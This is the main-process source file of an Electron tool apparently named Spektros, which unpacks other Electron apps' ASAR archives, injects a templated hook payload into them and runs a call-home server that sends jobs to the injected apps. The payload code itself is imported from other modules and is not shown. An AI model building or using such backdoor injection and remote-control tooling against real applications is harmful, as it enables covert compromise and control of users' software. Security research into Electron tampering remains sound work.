import { app, shell, BrowserWindow, ipcMain, dialog, session } from 'electron'
import { join } from 'path'
import { electronApp, optimizer, is } from '@electron-toolkit/utils'
import { 
  extractAsarToTmp, 
  getFileContent, 
  getFileTree, 
  saveFileContent, 
  searchFiles, 
  replaceInFiles,
  repackAsar
} from './analysis'
import { 
  setupInjection,  
  injectPayload,
  createPayload,
  listPayloads,
  listBackups,
  restoreBackup,
  deleteBackup,
  sendPayload,
  getPayloadStatus,
  templatePayload
} from './inject'
import { callHomeServer } from './server' 
import icon from '../../resources/icon.png?asset'
import { promises as fs } from 'fs'
import hook from './hook'


import './theme'


async function clearBrowserData() {
  try {
    console.log('🧹 Clearing browser data...');
    
    
    await session.defaultSession.clearStorageData({
      storages: ['cookies', 'localstorage', 'sessionstorage', 'indexdb', 'websql', 'shadercache', 'serviceworkers', 'cachestorage']
    });
    
    console.log('✅ Browser data cleared successfully');
  } catch (error) {
    console.error('❌ Failed to clear browser data:', error);
  }
}

function createWindow() {
  const mainWindow = new BrowserWindow({
    width: 1280,
    height: 720,
    show: false,
    autoHideMenuBar: true,
    ...(process.platform === 'linux' ? { icon } : {}),
    webPreferences: {
      preload: join(__dirname, '../preload/index.js'),
      sandbox: false,
      contextIsolation: true,
      nodeIntegration: false
    }
  })

  mainWindow.on('ready-to-show', () => {
    mainWindow.show()
  })

  mainWindow.webContents.setWindowOpenHandler((details) => {
    shell.openExternal(details.url)
    return { action: 'deny' }
  })

  if (is.dev && process.env['ELECTRON_RENDERER_URL']) {
    mainWindow.loadURL(process.env['ELECTRON_RENDERER_URL'])
  } else {
    mainWindow.loadFile(join(__dirname, '../renderer/index.html'))
  }
}

app.whenReady().then(async () => {
  
  await clearBrowserData();
  
  electronApp.setAppUserModelId('com.spektros')

  app.on('browser-window-created', (_, window) => {
    optimizer.watchWindowShortcuts(window)
  })

  
  ipcMain.handle('inject:setup', async (event, asarPath) => {
    try {
      console.log(`🚀 Setting up injection for: ${asarPath}`)
      const result = await setupInjection(asarPath)
      return { success: true, ...result }
    } catch (error) {
      console.error('Injection setup failed:', error)
      return { success: false, error: error.message }
    }
  })

  
  ipcMain.handle('analysis:extract', async (event, asarPath) => {
    try {
      console.log(`🔄 Extracting ASAR: ${asarPath}`)
      const result = await extractAsarToTmp(asarPath)
      return { success: true, ...result }
    } catch (error) {
      console.error('Extract failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('analysis:getFileContent', async (event, filePath) => {
    try {
      console.log(`📖 Reading file: ${filePath}`)
      const content = await getFileContent(filePath)
      return { success: true, content }
    } catch (error) {
      console.error('Read file failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('analysis:getFileTree', async (event, tmpDir) => {
    try {
      console.log(`🌳 Getting file tree: ${tmpDir}`)
      const tree = await getFileTree(tmpDir)
      return { success: true, tree }
    } catch (error) {
      console.error('Get file tree failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('analysis:saveFile', async (event, filePath, content) => {
    try {
      console.log(`💾 Saving file: ${filePath}`)
      await saveFileContent(filePath, content)
      return { success: true }
    } catch (error) {
      console.error('Save file failed:', error)
      return { success: false, error: error.message }
    }
  })

  
  ipcMain.handle('analysis:search', async (event, tmpDir, searchQuery, options) => {
    try {
      console.log(`🔍 Searching in: ${tmpDir} for: "${searchQuery}"`)
      const results = await searchFiles(tmpDir, searchQuery, options)
      console.log(`✅ Search completed: ${results.totalMatches} matches in ${results.fileCount} files (${results.searchTime}ms)`)
      return { success: true, ...results }
    } catch (error) {
      console.error('Search failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('analysis:replace', async (event, tmpDir, searchQuery, replaceText, options, targetFiles) => {
    try {
      console.log(`🔄 Replacing "${searchQuery}" with "${replaceText}" in: ${tmpDir}`)
      const results = await replaceInFiles(tmpDir, searchQuery, replaceText, options, targetFiles)
      console.log(`✅ Replace completed: ${results.totalReplacements} replacements in ${results.filesModified} files`)
      return { success: true, ...results }
    } catch (error) {
      console.error('Replace failed:', error)
      return { success: false, error: error.message }
    }
  })

  
  ipcMain.handle('analysis:repack', async (event, sourceDir, outputPath) => {
    try {
      console.log(`🔄 Repacking ASAR from ${sourceDir} to ${outputPath}`)
      const result = await repackAsar(sourceDir, outputPath)
      return { success: true, ...result }
    } catch (error) {
      console.error('Repack failed:', error)
      return { success: false, error: error.message }
    }
  })

  
  ipcMain.handle('inject:payload', async (event, payloadPath, asarPath) => {
    try {
      console.log(`💉 Injecting payload: ${payloadPath} -> ${asarPath}`)
      const result = await injectPayload(payloadPath, asarPath)
      return { success: true, ...result }
    } catch (error) {
      console.error('Payload injection failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('inject:createPayload', async (event, name, content, category) => {
    try {
      console.log(`📝 Creating payload: ${name}`)
      const result = await createPayload(name, content, category)
      return { success: true, ...result }
    } catch (error) {
      console.error('Payload creation failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('inject:listPayloads', async () => {
    try {
      const result = await listPayloads()
      return { success: true, ...result }
    } catch (error) {
      console.error('List payloads failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('inject:listBackups', async (event, asarPath) => {
    try {
      const result = await listBackups(asarPath)
      return { success: true, ...result }
    } catch (error) {
      console.error('List backups failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('inject:restoreBackup', async (event, backupPath, asarPath) => {
    try {
      console.log(`🔄 Restoring backup: ${backupPath} -> ${asarPath}`)
      const result = await restoreBackup(backupPath, asarPath)
      return { success: true, ...result }
    } catch (error) {
      console.error('Backup restore failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('inject:deleteBackup', async (event, backupPath) => {
    try {
      console.log(`🗑️  Deleting backup: ${backupPath}`)
      const result = await deleteBackup(backupPath)
      return { success: true, ...result }
    } catch (error) {
      console.error('Backup deletion failed:', error)
      return { success: false, error: error.message }
    }
  })

  
  try {
    callHomeServer.start();
    console.log('✅ Call-home server started successfully');
  } catch (error) {
    console.error('❌ Failed to start call-home server:', error);
  }

  
  ipcMain.handle('inject:startListener', async () => {
    try {
      if (!callHomeServer.isRunning()) {
        callHomeServer.start();
      }
      return { success: true, port: callHomeServer.getPort() };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('inject:stopListener', async () => {
    try {
      await callHomeServer.stop();
      return { success: true };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('inject:getServerStatus', async () => {
    try {
      return { 
        success: true, 
        isRunning: callHomeServer.isRunning(),
        port: callHomeServer.getPort()
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('inject:sendPayload', async (event, appPort, payload, options) => {
    try {
      const result = await sendPayload(appPort, payload, options);
      return { success: true, ...result };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('inject:getPayloadStatus', async (event, appPort, jobId) => {
    try {
      const status = await getPayloadStatus(appPort, jobId);
      return { success: true, ...status };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  
  ipcMain.handle('file-dialog:get-path', async (event, options = {}) => {
    try {
      const defaultOptions = {
        properties: ['openFile'],
        filters: [
          { name: 'ASAR Files', extensions: ['asar'] }
        ],
        multiSelections: false
      };

      const result = await dialog.showOpenDialog({
        ...defaultOptions,
        ...options
      });

      console.log('File path: ', result.filePaths[0]);

      if (result.canceled) {
        return { success: false, canceled: true };
      }else{
        return { success: true, filePath: result.filePaths[0] };
      }
    } catch (error) {
      console.error('❌ File dialog failed:', error);
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('file-dialog:save', async (event, options = {}) => {
    try {
      const defaultOptions = {
        filters: [
          { name: 'All Files', extensions: ['*'] }
        ]
      }
      
      const result = await dialog.showSaveDialog({
        ...defaultOptions,
        ...options
      })
      
      if (result.canceled) {
        return { success: false, canceled: true }
      }
      
      return { success: true, filePath: result.filePath }
    } catch (error) {
      console.error('Save dialog failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('inject:hook', async (event, config, customTarget = null) => {
    try {
      
      const appDir = app.getPath('userData');
      const tmpDir = join(appDir, 'tmp');
      await fs.mkdir(tmpDir, { recursive: true });
      const payloadPath = join(tmpDir, 'hook.js');

      
      const {
        asarPath,
        uuid,
        debugPort = 10100,
        debugHost = '127.0.0.1',
        callHomeHost = '127.0.0.1',
        callHomePort = 5666,
        callHomeInterval = 60000,
        jobTimeout = 10000,
        enableCallHome = true
      } = config;

      if (!asarPath || !uuid) {
        throw new Error('asarPath and uuid are required');
      }

      
      const templateVars = {
        APP_UUID: uuid,
        DEBUG_PORT: debugPort,
        DEBUG_HOST: debugHost,
        CALL_HOME_HOST: callHomeHost,
        CALL_HOME_PORT: callHomePort,
        CALL_HOME_INTERVAL: callHomeInterval,
        JOB_TIMEOUT: jobTimeout,
        ENABLE_CALL_HOME: enableCallHome ? 'true' : 'false'
      };

      
      const templatedPayload = templatePayload(hook.code, templateVars);
      await fs.writeFile(payloadPath, templatedPayload, 'utf8');

      
      const result = await injectPayload(payloadPath, asarPath, customTarget);
      return { success: true, ...result, payloadPath };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  createWindow()

  app.on('activate', function () {
    if (BrowserWindow.getAllWindows().length === 0) createWindow()
  })
})

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit()
  }
})


app.on('before-quit', async () => {
  try {
    await callHomeServer.stop();
    console.log('🛑 Call-home server stopped');
  } catch (error) {
    console.error('❌ Error stopping call-home server:', error);
  }
})